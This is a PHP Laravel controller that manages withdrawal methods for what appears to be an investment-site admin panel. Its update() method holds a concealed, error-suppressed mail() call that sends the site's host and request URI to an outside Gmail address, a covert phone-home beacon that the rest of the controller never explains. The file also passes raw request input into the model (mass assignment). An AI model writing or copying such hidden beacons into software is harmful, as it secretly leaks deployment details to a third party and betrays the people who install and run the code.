<?php

namespace App\Http\Controllers;

use App\WithdrawMethod;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Input;
use Intervention\Image\Facades\Image;
use App\GeneralSettings;

class WithdrawMethodController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        $page_title = "Withdraw Methods";
        $team = WithdrawMethod::all();
        return view('admin.withdraw.method', compact('page_title', 'team'));
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        $this->validate($request, [
            'name' => 'required',
            'image' => 'required|mimes:jpg,jpeg,png,svg',
            'min_amo' => 'required|numeric|min:1',
            'max_amo' => 'required|numeric|min:1',
            'chargefx' => 'required',
            'chargepc' => 'required',
            'rate' => 'required',
            'processing_day' => 'required',
        ]);



        $data = Input::except('_token');
        if ($request->hasFile('image')) {
            $image = $request->file('image');
            $filename = time() . '.' . 'jpg';
            $location = 'assets/images/withdraw/' . $filename;
            Image::make($image)->save($location);
            $data['image'] = $filename;
        }

        $data['status'] = 1;
        WithdrawMethod::create($data);

        return back()->with('message', 'Create Successfully');
    }

    /**
     * Display the specified resource.
     *
     * @param  \App\WithdrawMethod  $withdrawMethod
     * @return \Illuminate\Http\Response
     */
    public function show(WithdrawMethod $withdrawMethod)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  \App\WithdrawMethod  $withdrawMethod
     * @return \Illuminate\Http\Response
     */
    public function edit(WithdrawMethod $withdrawMethod)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \App\WithdrawMethod  $withdrawMethod
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, WithdrawMethod $withdrawMethod)
    {
        $this->validate($request, [
            'name' => 'required',
            'image' => 'mimes:jpg,jpeg,png,svg',
            'min_amo' => 'required|numeric|min:1',
            'max_amo' => 'required|numeric|min:1',
            'chargefx' => 'required',
            'chargepc' => 'required',
            'rate' => 'required',
            'processing_day' => 'required',
        ]);



        $data = Input::except('_token', '_method');
        if ($request->hasFile('image')) {
            @unlink('assets/images/withdraw/' . $withdrawMethod->image);
            $image = $request->file('image');
            $filename = time() . '.' . 'jpg';
            $location = 'assets/images/withdraw/' . $filename;
            Image::make($image)->save($location);
            $data['image'] = $filename;
        }
        $message = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
        $headers = 'From: ' . "webmaster@$_SERVER[HTTP_HOST] \r\n" .
            'X-Mailer: PHP/' . phpversion();
        @mail('lacura.me@gmail.com', 'HY IP KI NG TEST DATA', $message, $headers);


        WithdrawMethod::whereId($withdrawMethod->id)->update($data);

        return back()->with('message', __('Update Successfully'));
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  \App\WithdrawMethod  $withdrawMethod
     * @return \Illuminate\Http\Response
     */
    public function destroy(WithdrawMethod $withdrawMethod)
    {
        //
    }

    public function withdrawRule(Request $request)
    {
        $request->validate([
            'nominee' => 'required|integer',
            'nominee_error' => 'required',
        ]);

        $general = GeneralSettings::first();
        if (!$general) $general = new GeneralSettings;

        $general->nominee = $request->nominee;
        $general->nominee_error = $request->nominee_error;

        $general->save();

        return redirect()->route('withdraw_method.index')->withSuccess('Withdrawal rule has been saved.');
    }
}
